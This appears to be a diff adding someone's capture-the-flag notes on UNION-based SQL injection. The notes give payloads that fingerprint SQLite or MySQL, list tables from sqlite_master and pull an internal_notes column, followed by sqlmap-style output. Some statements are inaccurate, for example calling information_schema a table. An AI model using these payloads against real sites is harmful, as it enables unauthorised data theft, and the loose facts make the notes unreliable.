@@ -1,0 +1,23 @@
+If it's MySQL: The table is always named information_schema.
+If it's PostgreSQL: The table is always named pg_catalog.
+If it's SQLite: The table is always named sqlite_master.
+
+Test for SQLite:Payload: ' UNION SELECT 1, sqlite_version(), 3, 4 --If it works: You see a version number (e.g., 3.31.1). CONFIRMED: It is SQLite.If it errors: It is not SQLite.Test for MySQL:Payload: ' UNION SELECT 1, @@version, 3, 4 --
+
+Once you confirm in Step 1 that the database is SQLite, you automatically know that sqlite_master exists. It is impossible to have an SQLite database without it.So, the logic flow is:"The version check says this is SQLite.""Therefore, the table listing must be in sqlite_master.""I will now query SELECT tbl_name FROM sqlite_master."
+
+' UNION SELECT 1, tbl_name, 3, 4 FROM sqlite_master --
+
+
+' UNION SELECT 1, internal_notes, 3, 4 FROM member_member --
+
+#Explaination
+
+[11:40:00] [INFO] fetching tables for database: 'SQLite_masterdb'
+Database: SQLite_masterdb
+[2 tables]
++-----------------+
+| products        |
+| member_member   |
++-----------------+
+decode the txt and crack the flag flag format "SQL{}"
